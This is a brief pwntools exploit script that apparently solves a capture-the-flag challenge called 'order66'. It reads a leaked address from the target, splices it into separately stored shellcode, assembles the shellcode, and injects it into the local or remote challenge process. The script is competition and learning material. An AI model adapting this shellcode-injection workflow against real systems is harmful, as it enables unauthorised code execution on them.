#!/usr/bin/env python3
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "pwntools",
# ]
# ///

from pwn import *

context.arch = 'amd64'

REMOTE = False

if REMOTE:
    p = remote("ctf.polycyber.io", 53519)
else:
    p = process("./order66")

hint = int(p.recvline_contains("Hint").decode().split(" ")[1], 16)
print(f"Hint: {hex(hint)}")

data = read("shellcode.nasm").decode().replace("PLACEHOLDER", hex(hint))
write("shellcode-filled.nasm", data.encode())

assert os.system("nasm -f elf64 shellcode-filled.nasm -o shellcode.o && ld shellcode.o -o shellcode.exe && objcopy --dump-section .text=shellcode.bin shellcode.exe") == 0

code = read("shellcode.bin")

p.sendline(code)
print(p.recvall().decode())

for file in ("shellcode-filled.nasm", "shellcode.o", "shellcode.exe", "shellcode.bin"):
    if os.path.exists(file):
        os.remove(file)
